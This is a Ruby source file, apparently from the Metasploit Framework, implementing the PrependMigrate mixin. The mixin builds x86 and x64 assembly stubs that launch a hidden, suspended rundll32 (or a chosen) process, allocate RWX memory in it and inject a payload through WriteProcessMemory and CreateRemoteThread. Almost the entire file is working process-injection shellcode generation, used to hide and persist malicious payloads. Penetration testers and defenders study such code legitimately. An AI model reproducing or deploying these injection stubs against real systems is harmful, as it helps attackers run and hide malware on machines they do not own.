# -*- coding: binary -*-

###
#
# This mixin provides support for generating PrependMigrate blocks for Windows payloads
#
###
module Msf::Payload::Windows::PrependMigrate

  #
  # Initialize
  #
  def initialize(info = {})
    ret = super( info )

    register_advanced_options(
      [
        Msf::OptBool.new('PrependMigrate', [ true, "Spawns and runs shellcode in new process", false ]),
        Msf::OptString.new('PrependMigrateProc', [ false, "Process to spawn and run shellcode in" ])
      ], Msf::Payload::Windows )
    ret
  end

  #
  # Returns the state of the PrependMigrate option
  # See https://github.com/rapid7/metasploit-framework/pull/917
  # for discussion.
  #
  def prepend_migrate?
    datastore['PrependMigrate']
  end

  #
  # Overload the generate() call to prefix our stubs
  #
  def apply_prepend_migrate(buf)
    pre = ''

    test_arch = [ *(self.arch) ]

    if prepend_migrate?
      # Handle all x86 code here
      if test_arch.include?(ARCH_X86)
        migrate_asm = prepend_migrate(buf)
        pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
      # Handle all x64 code here
      elsif test_arch.include?(ARCH_X64)
        migrate_asm = prepend_migrate_64(buf)
        pre << Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
      end
    end
    return pre + buf
  end

  #
  # Create assembly
  #
  def prepend_migrate(buf)
    payloadsize = "0x%04x" % buf.length
    procname = datastore['PrependMigrateProc'] || 'rundll32'

    # Prepare instructions to get address of block_api into ebp
    block_api_start = <<-EOS
      call start
    EOS
    block_api_obj = Object.new.extend(Msf::Payload::Windows::BlockApi)
    block_api_asm = block_api_obj.asm_block_api

    # Prepare default exit block (sleep for a long long time)
    exitblock = %Q^
      ;sleep
      push -1
      push #{Rex::Text.block_api_hash("kernel32.dll", "Sleep")}           ; hash( "kernel32.dll", "Sleep" )
      call ebp                  ; Sleep( ... );
    ^
    
    # Check to see if we can find exitfunc in the payload
    exitfunc_block_asm = %Q^
    exitfunk:
      mov ebx, #{Rex::Text.block_api_hash("kernel32.dll", "ExitThread")}    ; The EXITFUNK as specified by user... kernel32.dll!ExitThread
      push #{Rex::Text.block_api_hash("kernel32.dll", "GetVersion")}        ; hash( "kernel32.dll", "GetVersion" )
      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
      cmp al, 6         ; If we are not running on Windows Vista, 2008 or 7
      jl goodbye       ; Then just call the exit function...
      cmp bl, 0xE0            ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
      jne goodbye      ;
      mov ebx, #{Rex::Text.block_api_hash("ntdll.dll", "RtlExitUserThread")}    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThreadgoodbye:                 ; We now perform the actual call to the exit function
    goodbye:  
      push 0x0            ; push the exit function parameter
      push ebx               ; push the hash of the exit function
      call ebp               ; call EXITFUNK( 0 );
    ^
    exitfunc_block_blob = Metasm::Shellcode.assemble(Metasm::Ia32.new, exitfunc_block_asm).encode_string
    exitfunc_index = buf.index(exitfunc_block_blob)
    if exitfunc_index
      exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
      exitblock = "exitblock:\njmp $+#{exitblock_offset}"
    end

    block_api_ebp_asm = <<-EOS
      pop ebp                   ; Pop off the address of 'api_call' for calling later.
    EOS
    block_close_to_payload = ''

    # Check if we can find block_api in the payload
    block_api = Metasm::Shellcode.assemble(Metasm::Ia32.new, block_api_asm).encode_string
    block_api_index = buf.index(block_api)
    if block_api_index

      # Prepare instructions to calculate address
      ebp_offset = "0x%04x" % (block_api_index + 5)
      block_api_ebp_asm = <<-EOS
        jmp close_to_payload
      return_from_close_to_payload:
        pop ebp
        add ebp, #{ebp_offset}
      EOS
      # Clear now-unneeded instructions
      block_api_asm = ''
      block_api_start = ''
      block_close_to_payload = <<-EOS
      close_to_payload:
        call return_from_close_to_payload
      EOS
    end

    #put all pieces together
    migrate_asm = <<-EOS
      cld                       ; Clear the direction flag.
      #{block_api_start}
      #{block_api_asm}
    start:
      #{block_api_ebp_asm}
      ; get our own startupinfo at esp+0x60
      add esp,-400              ; adjust the stack to avoid corruption
      lea edx,[esp+0x60]
      push edx
      push #{Rex::Text.block_api_hash("kernel32.dll", "GetStartupInfoA")}           ; hash( "kernel32.dll", "GetStartupInfoA" )
      call ebp                  ; GetStartupInfoA( &si );

      lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax

      jmp getcommand
      gotcommand:
      pop esi                   ; esi = address of process name (command line)

      ; create the process
      lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
      push edi                  ; lpProcessInformation : write processinfo here
      push eax                  ; lpStartupInfo : current info (read)
      xor ebx,ebx
      push ebx                  ; lpCurrentDirectory
      push ebx                  ; lpEnvironment
      push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
      push ebx                  ; bInHeritHandles
      push ebx                  ; lpThreadAttributes
      push ebx                  ; lpProcessAttributes
      push esi                  ; lpCommandLine
      push ebx                  ; lpApplicationName

      push #{Rex::Text.block_api_hash("kernel32.dll", "CreateProcessA")}           ; hash( "kernel32.dll", "CreateProcessA" )
      call ebp                  ; CreateProcessA( &si );

      ; if we didn't get a new process, use this one
      test eax,eax
      jz payload                ; If process creation failed, jump to shellcode

    goodProcess:
      ; allocate memory in the process (VirtualAllocEx())
      ; get handle
      push 0x40                 ; RWX
      add bh, 0x10              ; ebx = 0x1000
      push ebx                  ; MEM_COMMIT
    EOS

    if buf.length > 4096
      # probably stageless, so we don't have shellcode size constraints,
      # and so we can just set ebx to the size of the payload
      migrate_asm << <<-EOS
      mov ebx, #{payloadsize} ; stageless size
      EOS
    end

    migrate_asm << <<-EOS
      push ebx                  ; size
      xor ebx,ebx
      push ebx                  ; address
      push [edi]                ; handle
      push #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAllocEx")} ; hash( "kernel32.dll", "VirtualAllocEx" )
      call ebp                  ; VirtualAllocEx( ...);

      ; eax now contains the destination
      ; WriteProcessMemory()
      push esp                  ; lpNumberOfBytesWritten
      push #{payloadsize}       ; nSize
      ; pick up pointer to shellcode & keep it on stack
      jmp begin_of_payload
      begin_of_payload_return:  ; lpBuffer
      push eax                  ; lpBaseAddress
      push [edi]                ; hProcess
      push #{Rex::Text.block_api_hash("kernel32.dll", "WriteProcessMemory")} ; hash( "kernel32.dll", "WriteProcessMemory" )
      call ebp                  ; WriteProcessMemory( ...)

      ; run the code (CreateRemoteThread())
      push ebx                  ; lpthreadID
      push ebx                  ; run immediately
      push ebx                  ; no parameter
      mov ecx,[esp-0x4]
      push ecx                  ; shellcode
      push ebx                  ; stacksize
      push ebx                  ; lpThreadAttributes
      push [edi]
      push #{Rex::Text.block_api_hash("kernel32.dll", "CreateRemoteThread")} ; hash( "kernel32.dll", "CreateRemoteThread" )
      call ebp                  ; CreateRemoteThread( ...);

      #{exitblock}              ; jmp to exitfunc or long sleep

    getcommand:
      call gotcommand
      db "#{procname}"
      db 0x00
    #{block_close_to_payload}
    begin_of_payload:
      call begin_of_payload_return
    payload:
    EOS
    migrate_asm
  end


  def prepend_migrate_64(buf)
    payloadsize = "0x%04x" % buf.length
    procname = datastore['PrependMigrateProc'] || 'rundll32'

    # Prepare instructions to get address of block_api into ebp
    block_api_start = <<-EOS
      call start
    EOS
    block_api_obj = Object.new.extend(Msf::Payload::Windows::BlockApi_x64)
    block_api_asm = block_api_obj.asm_block_api

    # Prepare default exit block (sleep for a long long time)
    exitblock = <<-EOS
      ;sleep
      xor rcx,rcx
      dec rcx                   ; rcx = -1
      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "Sleep")}      ; hash( "kernel32.dll", "Sleep" )
      call rbp                  ; Sleep( ... );
    EOS

    exitfunc_block_asm = %Q^
    exitfunk:
      mov ebx, #{Rex::Text.block_api_hash("kernel32.dll", "ExitThread")}   ; The EXITFUNK as specified by user...
      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "GetVersion")}  ; hash( "kernel32.dll", "GetVersion" )
      call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)
      add rsp, 40           ; cleanup the default param space on stack
      cmp al, 0x6           ; If we are not running on Windows Vista, 2008 or 7
      jl goodbye            ; Then just call the exit function...
      cmp bl, 0xE0          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
      jne goodbye           ;
      mov ebx, #{Rex::Text.block_api_hash("ntdll.dll", "RtlExitUserThread")}   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
    goodbye:                ; We now perform the actual call to the exit function
      push 0x0              ;
      pop rcx               ; set the exit function parameter
      mov r10d, ebx         ; place the correct EXITFUNK into r10d
      call rbp              ; call EXITFUNK( 0 );
    ^
    # Check to see if we can find x64 exitfunc in the payload
    
    exitfunc_block_blob = Metasm::Shellcode.assemble(Metasm::X64.new, exitfunc_block_asm).encode_string
    exitfunc_index = buf.index(exitfunc_block_blob)
    if exitfunc_index
      exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
      exitblock = "exitblock:\njmp $+#{exitblock_offset}"
    end

    block_api_rbp_asm = <<-EOS
      pop rbp                   ; Pop off the address of 'api_call' for calling later.
    EOS
    block_close_to_payload = ''

    # Check if we can find block_api in the payload
    block_api = Metasm::Shellcode.assemble(Metasm::X64.new, block_api_asm).encode_string
    block_api_index = buf.index(block_api)
    if block_api_index

      # Prepare instructions to calculate address
      rbp_offset = "0x%04x" % (block_api_index + 5)
      block_api_rbp_asm = <<-EOS
        jmp close_to_payload
      return_from_close_to_payload:
        pop rbp
        add rbp, #{rbp_offset}
      EOS
      # Clear now-unneeded instructions
      block_api_asm = ''
      block_api_start = ''
      block_close_to_payload = <<-EOS
      close_to_payload:
        call return_from_close_to_payload
      EOS
    end

    #put all pieces together
    migrate_asm = <<-EOS
      cld                       ; Clear the direction flag.
      #{block_api_start}
      #{block_api_asm}
    start:
      #{block_api_rbp_asm}
      ; get our own startupinfo at esp+0x60
      add rsp,-400              ; adjust the stack to avoid corruption
      lea rcx,[rsp+0x30]
      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "GetStartupInfoA")}       ; hash( "kernel32.dll", "GetStartupInfoA" )
      call rbp                  ; GetStartupInfoA( &si );

      jmp getcommand
    gotcommand:
      pop rsi                   ; rsi = address of process name (command line)

      ; create the process
      push 0                    ; keep the stack aligned
      lea rdi,[rsp+0x120]       ; Offset of empty space for lpProcessInformation
      push rdi                  ; lpProcessInformation : write processinfo here
      lea rcx,[rsp+0x60]
      push rcx                  ; lpStartupInfo : current info (read)
      xor rcx,rcx
      push rcx                  ; lpCurrentDirectory
      push rcx                  ; lpEnvironment
      push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
      push rcx                  ; bInHeritHandles
      mov r9, rcx               ; lpThreadAttributes
      mov r8, rcx               ; lpProcessAttributes
      mov rdx, rsi              ; lpCommandLine
      ; rcx is already zero     ; lpApplicationName
      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "CreateProcessA")}      ; hash( "kernel32.dll", "CreateProcessA" )
      call rbp                  ; CreateProcessA( &si );

      ; if we didn't get a new process, use this one
      test rax,rax
      jz payload                ; If process creation failed, jump to shellcode

    goodProcess:
      ; allocate memory in the process (VirtualAllocEx())
      ; get handle
      push 0x40                 ; RWX
      mov r9,0x1000             ; 0x1000 = MEM_COMMIT
    EOS

    if buf.length > 4096
      # probably stageless, so we don't have shellcode size constraints,
      # and so we can just set r8 to the size of the payload
      migrate_asm << <<-EOS
      mov r8, #{payloadsize} ; stageless size
      EOS
    else
      # otherwise we'll just reuse r9 (4096) for size
      migrate_asm << <<-EOS
      mov r8,r9                 ; size
      EOS
    end

    migrate_asm << <<-EOS
      xor rdx,rdx               ; address
      mov rcx, [rdi]            ; handle
      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAllocEx")}       ; hash( "kernel32.dll", "VirtualAllocEx" )
      call rbp                  ; VirtualAllocEx( ...);

      ; eax now contains the destination - save in ebx
      mov rbx, rax              ; lpBaseAddress
      ; WriteProcessMemory()
      push rsp                  ; lpNumberOfBytesWritten
      mov r9, #{payloadsize}    ; nSize
      ; pick up pointer to shellcode & keep it on stack
      jmp begin_of_payload
      begin_of_payload_return:
      pop r8                    ; lpBuffer
      mov rdx, rax              ; lpBaseAddress
      mov rcx, [rdi]            ; hProcess
      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "WriteProcessMemory")}      ; hash( "kernel32.dll", "WriteProcessMemory" )
      call rbp                  ; WriteProcessMemory( ...);

      ; run the code (CreateRemoteThread())
      xor rcx, rcx              ; rdx = 0
      push rcx                  ; lpthreadID
      push rcx                  ; run immediately
      push rcx                  ; no parameter
      mov r9,rbx                ; shellcode
      mov r8, rcx               ; stacksize
      ;rdx already equals 0     ; lpThreadAttributes
      mov rcx, [rdi]
      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "CreateRemoteThread")}      ; hash( "kernel32.dll", "CreateRemoteThread" )
      call rbp                  ; CreateRemoteThread( ...);

      #{exitblock}              ; jmp to exitfunc or long sleep

    getcommand:
      call gotcommand
      db "#{procname}"
      db 0x00
    #{block_close_to_payload}
    begin_of_payload:
      call begin_of_payload_return
    payload:
    EOS
    migrate_asm
  end

end

